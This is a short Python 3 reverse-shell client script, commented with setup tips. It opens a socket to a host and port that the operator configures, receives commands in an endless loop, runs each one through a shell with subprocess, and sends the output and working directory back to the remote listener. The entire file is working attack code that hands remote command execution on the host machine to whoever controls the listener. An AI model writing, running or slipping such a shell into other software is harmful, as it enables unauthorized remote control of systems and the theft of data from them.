#----------------------------------------PYTHON-3 REVERSE_SHELL(SINGLE_CLIENT)------------------------------------------
# Required modules
import os
import subprocess
import socket

host = ""                                          # specify the host ip or static ip address inside the quotes
port = 4321                                        # make sure that you aren't mentioning the well-known ports
s = socket.socket()
s.connect((host, port))          # if you are checking in your local machi means specify socket.gethostname() instead of host in this line

while True:            # infinite loop
    msg = s.recv(50000)
    if msg[:2].decode('utf-8') == 'cd':
        os.chdir(msg[3:].decode('utf-8'))

    # This condition determines to get the actual shell in target system
    if len(msg) > 0:
        cmd = subprocess.Popen(msg[:].decode('utf-8'), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        str_output = str(output_bytes, 'utf-8')
        pwd = os.getcwd() + '>>>'
        s.send(str.encode(str_output + pwd))
